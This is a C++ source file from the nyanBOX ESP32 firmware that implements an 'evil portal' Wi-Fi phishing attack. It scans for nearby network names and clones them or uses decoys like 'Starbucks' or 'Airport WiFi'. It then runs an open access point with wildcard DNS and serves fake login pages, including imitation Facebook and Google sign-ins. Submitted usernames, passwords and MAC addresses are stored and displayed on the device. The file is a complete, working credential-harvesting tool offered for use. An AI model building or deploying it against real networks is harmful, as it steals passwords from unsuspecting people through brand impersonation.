/*
    nyanBOX by Nyan Devices
    https://github.com/jbohack/nyanBOX
    Copyright (c) 2025 jbohack

    Licensed under the MIT License
    https://opensource.org/licenses/MIT

    SPDX-License-Identifier: MIT
*/

#include "../include/evil_portal.h"
#include "../include/sleep_manager.h"
#include "../include/display_mirror.h"
#include "../include/pindefs.h"
#include "../include/setting.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include <WebServer.h>
#include <DNSServer.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

namespace {

enum EvilPortalState { 
    PORTAL_MENU, 
    PORTAL_RUNNING,
    PORTAL_VIEW_CREDS,
    PORTAL_SCANNING
};

EvilPortalState currentState = PORTAL_MENU;
int menuSelection = 0;
int credIndex = 0;
esp_netif_t *ap_netif = NULL;

struct Credential {
    String ssid;
    String username;
    String password;
    String macAddress;
    unsigned long captureTime;
};

std::vector<Credential> capturedCreds;
String currentSSID = "Free WiFi";
int connectedClients = 0;
int totalVisitors = 0;

std::vector<String> scannedSSIDs;
int currentSSIDIndex = 0;
bool portal_scanCompleted = false;
unsigned long portal_lastScanTime = 0;
unsigned long menuEnterTime = 0;
unsigned long portal_scanStartTime = 0;
unsigned long portal_lastDisplayUpdate = 0;
uint16_t portal_lastApCount = 0;
bool portal_isScanning = false;
const unsigned long SCAN_INTERVAL = 60000;
const unsigned long SCAN_DURATION = 8000;
const unsigned long DISPLAY_UPDATE_INTERVAL = 100;

static bool needsRedraw = true;
static int lastMenuSelection = -1;
static int lastCredIndex = -1;
static int lastConnectedClients = -1;
static int lastTotalVisitors = -1;
static int lastCapturedCredsSize = 0;
static int lastScannedSSIDsSize = 0;
static EvilPortalState lastState = PORTAL_MENU;
static String lastCurrentSSID = "";
static int lastCurrentTemplate = -1;
static unsigned long lastStatusUpdate = 0;
const unsigned long statusUpdateInterval = 1000;

const char* customSSIDs[] = {
    "Free WiFi", "Guest", "Hotel WiFi", "Airport WiFi",
    "Starbucks", "McDonald's WiFi", "Public WiFi", "Open Network"
};
const int customSSIDCount = sizeof(customSSIDs) / sizeof(customSSIDs[0]);

WebServer portalServer(80);
DNSServer portalDNS;
const byte DNS_PORT = 53;

const char* loginPortalHTML = R"(
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h2 { text-align: center; color: #333; margin-bottom: 30px; }
        input[type=text], input[type=password] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        input[type=submit] { width: 100%; background: #4CAF50; color: white; padding: 14px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        input[type=submit]:hover { background: #45a049; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h2>WiFi Network Login</h2>
        <p>Please enter your credentials to access the internet:</p>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Connect">
        </form>
        <div class="footer">Secure Connection</div>
    </div>
</body>
</html>
)";

const char* facebookPortalHTML = R"(
<!DOCTYPE html>
<html>
<head>
    <title>Facebook WiFi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; margin: 0; padding: 20px; background: #3b5998; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #3b5998; font-size: 28px; margin: 0; }
        input[type=text], input[type=password] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        input[type=submit] { width: 100%; background: #3b5998; color: white; padding: 14px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>facebook</h1>
        </div>
        <p>Log in to Facebook to continue to WiFi</p>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Email or Phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Log In">
        </form>
        <div class="footer">Facebook WiFi powered by Facebook</div>
    </div>
</body>
</html>
)";

const char* googlePortalHTML = R"(
<!DOCTYPE html>
<html>
<head>
    <title>Google WiFi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Roboto', Arial; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #4285f4; font-size: 24px; margin: 0; }
        h2 { text-align: center; font-weight: 400; color: #333; }
        input[type=text], input[type=password] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        input[type=submit] { width: 100%; background: #4285f4; color: white; padding: 14px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Google</h1>
        </div>
        <h2>Sign in to WiFi</h2>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Next">
        </form>
        <div class="footer">Google WiFi</div>
    </div>
</body>
</html>
)";

int currentTemplate = 0;
const char* portalTemplates[] = {
    loginPortalHTML,
    facebookPortalHTML,
    googlePortalHTML
};
const char* templateNames[] = {
    "Generic Login",
    "Facebook WiFi",
    "Google WiFi"
};
const int numTemplates = 3;

void handleCaptivePortal() {
    portalServer.send(200, "text/html", portalTemplates[currentTemplate]);
    totalVisitors++;
}

void handleLogin() {
    String username = portalServer.arg("username");
    String password = portalServer.arg("password");
    
    if (username.length() > 0 && password.length() > 0) {
        Credential newCred;
        newCred.ssid = currentSSID;
        newCred.username = username;
        newCred.password = password;

        String macAddr = "Unknown";
        wifi_sta_list_t stationList;
        esp_err_t err = esp_wifi_ap_get_sta_list(&stationList);

        if (err == ESP_OK && stationList.num > 0) {
            int lastIdx = (stationList.num == 1) ? 0 : stationList.num - 1;
            char macStr[18];
            snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                stationList.sta[lastIdx].mac[0], stationList.sta[lastIdx].mac[1],
                stationList.sta[lastIdx].mac[2], stationList.sta[lastIdx].mac[3],
                stationList.sta[lastIdx].mac[4], stationList.sta[lastIdx].mac[5]);
            macAddr = String(macStr);
        }

        newCred.macAddress = macAddr;
        newCred.captureTime = millis();
        capturedCreds.push_back(newCred);
    }
    portalServer.send(200, "text/html",
        "<html><body style='font-family:Arial;text-align:center;padding:50px;'>"
        "<h2>Connected Successfully!</h2>"
        "<p>You are now connected to the internet.</p>"
        "<p>Thank you for using our WiFi service.</p>"
        "</body></html>");
}

void setupPortalAP() {
    wifi_mode_t currentMode;
    if (esp_wifi_get_mode(&currentMode) == ESP_OK) {
        esp_wifi_stop();
        delay(50);
        esp_wifi_deinit();
        delay(50);
    }

    if (ap_netif != NULL) {
        esp_netif_destroy(ap_netif);
        ap_netif = NULL;
    }

    ap_netif = esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_AP);

    wifi_config_t ap_config = {};
    memset(&ap_config, 0, sizeof(wifi_config_t));
    strncpy((char*)ap_config.ap.ssid, currentSSID.c_str(), sizeof(ap_config.ap.ssid) - 1);
    ap_config.ap.ssid[sizeof(ap_config.ap.ssid) - 1] = '\0';
    ap_config.ap.ssid_len = currentSSID.length();
    ap_config.ap.channel = 1;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.ssid_hidden = 0;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 100;

    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    delay(200);

    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(ap_netif, &ip_info) == ESP_OK) {
        IPAddress apIP(ip_info.ip.addr);
        portalDNS.stop();
        portalDNS.start(DNS_PORT, "*", apIP);
    }

    portalServer.onNotFound(handleCaptivePortal);
    portalServer.on("/", handleCaptivePortal);
    portalServer.on("/login", HTTP_POST, handleLogin);
    portalServer.on("/generate_204", handleCaptivePortal);
    portalServer.on("/hotspot-detect.html", handleCaptivePortal);
    portalServer.on("/connecttest.txt", handleCaptivePortal);
    portalServer.on("/redirect", handleCaptivePortal);

    portalServer.begin();
}

void stopPortalAP() {
    portalServer.stop();
    portalDNS.stop();
    esp_wifi_stop();
    delay(50);
    esp_wifi_deinit();
    delay(50);

    if (ap_netif != NULL) {
        esp_netif_destroy(ap_netif);
        ap_netif = NULL;
    }
}

void processScanResults(unsigned long now) {
    uint16_t number = 0;
    esp_wifi_scan_get_ap_num(&number);
    
    if (number == 0) return;
    
    wifi_ap_record_t *ap_info = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * number);
    if (ap_info == NULL) return;
    
    memset(ap_info, 0, sizeof(wifi_ap_record_t) * number);
    uint16_t actual_number = number;
    esp_err_t err = esp_wifi_scan_get_ap_records(&actual_number, ap_info);
    
    if (err == ESP_OK) {
        for (int i = 0; i < actual_number && scannedSSIDs.size() < 92; i++) {
            if (ap_info[i].ssid[0] != '\0') {
                String ssid = String((char*)ap_info[i].ssid);
                bool exists = false;
                for (const String& existingSSID : scannedSSIDs) {
                    if (existingSSID == ssid) {
                        exists = true;
                        break;
                    }
                }
                if (!exists) {
                    scannedSSIDs.push_back(ssid);
                }
            }
        }
    }
    
    free(ap_info);
}

void startScan() {
    scannedSSIDs.clear();
    portal_isScanning = true;
    portal_scanCompleted = false;
    portal_lastApCount = 0;
    portal_scanStartTime = millis();
    portal_lastDisplayUpdate = millis();
    
    esp_wifi_set_mode(WIFI_MODE_STA);
    delay(100);
    
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = false,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = {
            .active = {
                .min = 120,
                .max = 200
            }
        }
    };
    
    esp_wifi_scan_start(&scan_config, false);
    currentState = PORTAL_SCANNING;
}

void updateScan() {
    unsigned long now = millis();

    uint16_t currentApCount = 0;
    esp_wifi_scan_get_ap_num(&currentApCount);

    if (currentApCount > portal_lastApCount) {
        processScanResults(now);
        portal_lastApCount = currentApCount;
    }

    if (lastScannedSSIDsSize != (int)scannedSSIDs.size()) {
        lastScannedSSIDsSize = (int)scannedSSIDs.size();
        needsRedraw = true;
    }

    if (now - portal_lastDisplayUpdate > DISPLAY_UPDATE_INTERVAL) {
        portal_lastDisplayUpdate = now;
        needsRedraw = true;
    }

    if (needsRedraw) {
        needsRedraw = false;

        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(0, 10, "Scanning WiFi...");

        char countStr[32];
        snprintf(countStr, sizeof(countStr), "Found: %d networks", (int)scannedSSIDs.size());
        u8g2.drawStr(0, 25, countStr);

        int barWidth = 120;
        int barHeight = 10;
        int barX = 4;
        int barY = 35;
        u8g2.drawFrame(barX, barY, barWidth, barHeight);

        unsigned long elapsed = now - portal_scanStartTime;
        int fillWidth = ((elapsed * (barWidth - 4)) / SCAN_DURATION);
        if (fillWidth > (barWidth - 4)) fillWidth = barWidth - 4;
        if (fillWidth > 0) {
            u8g2.drawBox(barX + 2, barY + 2, fillWidth, barHeight - 4);
        }

        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 60, "Press SEL to exit");
        u8g2.sendBuffer();
        displayMirrorSend(u8g2);
    }
    
    if (now - portal_scanStartTime > SCAN_DURATION) {
        processScanResults(now);
        esp_wifi_scan_stop();

        for (int i = 0; i < customSSIDCount && scannedSSIDs.size() < 100; i++) {
            String customSSID = String(customSSIDs[i]);
            bool exists = false;
            for (const String& existingSSID : scannedSSIDs) {
                if (existingSSID == customSSID) {
                    exists = true;
                    break;
                }
            }
            if (!exists) {
                scannedSSIDs.push_back(customSSID);
            }
        }

        portal_isScanning = false;
        portal_scanCompleted = true;
        portal_lastScanTime = now;
        currentState = PORTAL_MENU;

        if (!scannedSSIDs.empty()) {
            if (currentSSIDIndex >= scannedSSIDs.size()) {
                currentSSIDIndex = 0;
            }
            currentSSID = scannedSSIDs[currentSSIDIndex];
        }
    }
}

void drawPortalMenu() {
    u8g2.clearBuffer();
    
    const char* menuItems[] = {
        "Start Portal",
        "Change Template", 
        "Change SSID",
        "View Captured"
    };
    
    for (int i = 0; i < 4; i++) {
        char itemStr[32];
        bool selected = (menuSelection == i);
        
        if (i == 1) {
            snprintf(itemStr, sizeof(itemStr), "%s %s",
                    selected ? ">" : " ", templateNames[currentTemplate]);
        } else if (i == 2) {
            char maskedSSID[33];
            maskName(currentSSID.c_str(), maskedSSID, sizeof(maskedSSID) - 1);
            char truncatedSSID[16];
            if (strlen(maskedSSID) > 12) {
                strncpy(truncatedSSID, maskedSSID, 12);
                truncatedSSID[12] = '\0';
                strcat(truncatedSSID, "..");
            } else {
                strcpy(truncatedSSID, maskedSSID);
            }
            snprintf(itemStr, sizeof(itemStr), "%s SSID: %s",
                    selected ? ">" : " ", truncatedSSID);
        } else if (i == 3) {
            snprintf(itemStr, sizeof(itemStr), "%s %s (%d)",
                    selected ? ">" : " ", menuItems[i], (int)capturedCreds.size());
        } else {
            snprintf(itemStr, sizeof(itemStr), "%s %s",
                    selected ? ">" : " ", menuItems[i]);
        }
        
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 12 + (i * 10), itemStr);
    }
    
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "U/D=NAV R=OK SEL=EXIT");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void drawPortalStatus() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 10, "Portal Running");
    char maskedSSID[33];
    maskName(currentSSID.c_str(), maskedSSID, sizeof(maskedSSID) - 1);
    char ssidStr[22];
    if (strlen(maskedSSID) > 18) {
        strncpy(ssidStr, maskedSSID, 16);
        ssidStr[16] = '\0';
        strcat(ssidStr, "..");
    } else {
        strcpy(ssidStr, maskedSSID);
    }
    u8g2.drawStr(0, 22, ssidStr);
    char templateStr[22];
    if (strlen(templateNames[currentTemplate]) > 18) {
        strncpy(templateStr, templateNames[currentTemplate], 16);
        templateStr[16] = '\0';
        strcat(templateStr, "..");
    } else {
        strcpy(templateStr, templateNames[currentTemplate]);
    }
    u8g2.drawStr(0, 34, templateStr);

    char statsStr[32];
    snprintf(statsStr, sizeof(statsStr), "Clients:%d Visits:%d", connectedClients, totalVisitors);
    u8g2.drawStr(0, 46, statsStr);

    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 62, "L=Stop SEL=EXIT");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void drawCredentialsList() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    
    if (capturedCreds.empty()) {
        u8g2.drawStr(0, 10, "No Credentials");
        u8g2.drawStr(0, 22, "Captured Yet");
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "L=Back SEL=EXIT");
    } else {
        const Credential& cred = capturedCreds[credIndex];

        char maskedSSIDFull[33];
        maskName(cred.ssid.c_str(), maskedSSIDFull, sizeof(maskedSSIDFull) - 1);
        char ssidStr[22];
        if (strlen(maskedSSIDFull) > 20) {
            strncpy(ssidStr, maskedSSIDFull, 18);
            ssidStr[18] = '\0';
            strcat(ssidStr, "..");
        } else {
            strcpy(ssidStr, maskedSSIDFull);
        }
        u8g2.drawStr(0, 10, "Net:");
        u8g2.drawStr(25, 10, ssidStr);

        char maskedMACFull[18];
        maskMAC(cred.macAddress.c_str(), maskedMACFull);
        char macStr[18];
        if (strlen(maskedMACFull) > 17) {
            strncpy(macStr, maskedMACFull, 17);
            macStr[17] = '\0';
        } else {
            strcpy(macStr, maskedMACFull);
        }
        u8g2.drawStr(0, 20, "MAC:");
        u8g2.drawStr(25, 20, macStr);

        char userStr[22];
        if (cred.username.length() > 20) {
            strncpy(userStr, cred.username.c_str(), 18);
            userStr[18] = '\0';
            strcat(userStr, "..");
        } else {
            strcpy(userStr, cred.username.c_str());
        }
        u8g2.drawStr(0, 30, "User:");
        u8g2.drawStr(30, 30, userStr);

        char passStr[22];
        if (cred.password.length() > 20) {
            strncpy(passStr, cred.password.c_str(), 18);
            passStr[18] = '\0';
            strcat(passStr, "..");
        } else {
            strcpy(passStr, cred.password.c_str());
        }
        u8g2.drawStr(0, 40, "Pass:");
        u8g2.drawStr(30, 40, passStr);

        char infoStr[32];
        unsigned long currentTime = millis();
        unsigned long elapsedMs = currentTime - cred.captureTime;
        unsigned long elapsedMinutes = elapsedMs / 60000;
        snprintf(infoStr, sizeof(infoStr), "%d/%d - %lum ago",
                credIndex + 1, (int)capturedCreds.size(), elapsedMinutes);
        u8g2.drawStr(0, 50, infoStr);

        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.drawStr(0, 62, "U/D=Nav L=Back SEL=EXIT");
    }
    
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

}

void evilPortalSetup() {
    currentState = PORTAL_MENU;
    menuSelection = 0;
    credIndex = 0;
    totalVisitors = 0;
    connectedClients = 0;
    currentSSIDIndex = 0;
    menuEnterTime = millis();

    needsRedraw = true;
    lastMenuSelection = -1;
    lastCredIndex = -1;
    lastConnectedClients = -1;
    lastTotalVisitors = -1;
    lastCapturedCredsSize = 0;
    lastScannedSSIDsSize = 0;
    lastState = PORTAL_MENU;
    lastCurrentSSID = "";
    lastCurrentTemplate = -1;
    lastStatusUpdate = 0;

    pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
    pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
    pinMode(BUTTON_PIN_RIGHT, INPUT_PULLUP);
    pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);

    esp_netif_init();
    esp_event_loop_create_default();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();

    scannedSSIDs.clear();
    portal_isScanning = true;
    portal_scanCompleted = false;
    portal_lastApCount = 0;
    portal_scanStartTime = millis();
    portal_lastDisplayUpdate = millis();
    
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = false,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = {
            .active = {
                .min = 120,
                .max = 200
            }
        }
    };
    
    esp_wifi_scan_start(&scan_config, false);
    currentState = PORTAL_SCANNING;
}

void evilPortalLoop() {
    unsigned long now = millis();

    static bool upPressed = false, downPressed = false;
    static bool rightPressed = false, leftPressed = false;
    bool upNow = digitalRead(BUTTON_PIN_UP) == LOW;
    bool downNow = digitalRead(BUTTON_PIN_DOWN) == LOW;
    bool rightNow = digitalRead(BUTTON_PIN_RIGHT) == LOW;
    bool leftNow = digitalRead(BUTTON_PIN_LEFT) == LOW;

    if (lastState != currentState) {
        lastState = currentState;
        needsRedraw = true;
    }

    if (currentState == PORTAL_SCANNING) {
        updateScan();
        upPressed = upNow;
        downPressed = downNow;
        rightPressed = rightNow;
        leftPressed = leftNow;
        return;
    }

    switch (currentState) {
        case PORTAL_MENU:
            if (portal_scanCompleted && now - portal_lastScanTime > SCAN_INTERVAL) {
                startScan();
                return;
            }

            if (lastMenuSelection != menuSelection) {
                lastMenuSelection = menuSelection;
                needsRedraw = true;
            }
            if (lastCurrentSSID != currentSSID) {
                lastCurrentSSID = currentSSID;
                needsRedraw = true;
            }
            if (lastCurrentTemplate != currentTemplate) {
                lastCurrentTemplate = currentTemplate;
                needsRedraw = true;
            }
            if (lastCapturedCredsSize != (int)capturedCreds.size()) {
                lastCapturedCredsSize = (int)capturedCreds.size();
                needsRedraw = true;
            }

            if (upNow && !upPressed) {
                menuSelection = (menuSelection - 1 + 4) % 4;
                needsRedraw = true;
                delay(200);
            }
            if (downNow && !downPressed) {
                menuSelection = (menuSelection + 1) % 4;
                needsRedraw = true;
                delay(200);
            }
            if (rightNow && !rightPressed) {
                switch (menuSelection) {
                    case 0:
                        setupPortalAP();
                        currentState = PORTAL_RUNNING;
                        needsRedraw = true;
                        break;
                    case 1:
                        currentTemplate = (currentTemplate + 1) % numTemplates;
                        needsRedraw = true;
                        break;
                    case 2:
                        if (!scannedSSIDs.empty()) {
                            currentSSIDIndex = (currentSSIDIndex + 1) % scannedSSIDs.size();
                            currentSSID = scannedSSIDs[currentSSIDIndex];
                        } else {
                            static int ssidIndex = 0;
                            ssidIndex = (ssidIndex + 1) % customSSIDCount;
                            currentSSID = String(customSSIDs[ssidIndex]);
                        }
                        needsRedraw = true;
                        break;
                    case 3:
                        currentState = PORTAL_VIEW_CREDS;
                        credIndex = 0;
                        needsRedraw = true;
                        break;
                }
                delay(200);
            }

            if (needsRedraw) {
                needsRedraw = false;
                drawPortalMenu();
            }
            break;
            
        case PORTAL_RUNNING:
            if (leftNow && !leftPressed) {
                stopPortalAP();

                wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
                esp_wifi_init(&cfg);
                esp_wifi_set_mode(WIFI_MODE_STA);
                esp_wifi_start();

                currentState = PORTAL_MENU;
                menuEnterTime = millis();
                needsRedraw = true;
                delay(200);
            }
            portalDNS.processNextRequest();
            portalServer.handleClient();

            wifi_sta_list_t stationList;
            esp_wifi_ap_get_sta_list(&stationList);
            connectedClients = stationList.num;

            if (lastConnectedClients != connectedClients) {
                lastConnectedClients = connectedClients;
                needsRedraw = true;
            }
            if (lastTotalVisitors != totalVisitors) {
                lastTotalVisitors = totalVisitors;
                needsRedraw = true;
            }

            if (now - lastStatusUpdate >= statusUpdateInterval) {
                lastStatusUpdate = now;
                needsRedraw = true;
            }

            if (needsRedraw) {
                needsRedraw = false;
                drawPortalStatus();
            }
            break;
            
        case PORTAL_VIEW_CREDS:
            if (lastCredIndex != credIndex) {
                lastCredIndex = credIndex;
                needsRedraw = true;
            }

            if (now - lastStatusUpdate >= statusUpdateInterval) {
                lastStatusUpdate = now;
                needsRedraw = true;
            }

            if (upNow && !upPressed && !capturedCreds.empty()) {
                credIndex = (credIndex - 1 + capturedCreds.size()) % capturedCreds.size();
                needsRedraw = true;
                delay(200);
            }
            if (downNow && !downPressed && !capturedCreds.empty()) {
                credIndex = (credIndex + 1) % capturedCreds.size();
                needsRedraw = true;
                delay(200);
            }
            if (leftNow && !leftPressed) {
                currentState = PORTAL_MENU;
                menuEnterTime = millis();
                needsRedraw = true;
                delay(200);
            }

            if (needsRedraw) {
                needsRedraw = false;
                drawCredentialsList();
            }
            break;
    }
    upPressed = upNow;
    downPressed = downNow;
    rightPressed = rightNow;
    leftPressed = leftNow;
}

void cleanupEvilPortal() {
    if (currentState == PORTAL_RUNNING) {
        portalServer.stop();
        portalDNS.stop();
    }

    esp_wifi_stop();
    delay(50);
    esp_wifi_deinit();
    delay(50);

    if (ap_netif != NULL) {
        esp_netif_destroy(ap_netif);
        ap_netif = NULL;
    }

    delay(100);
}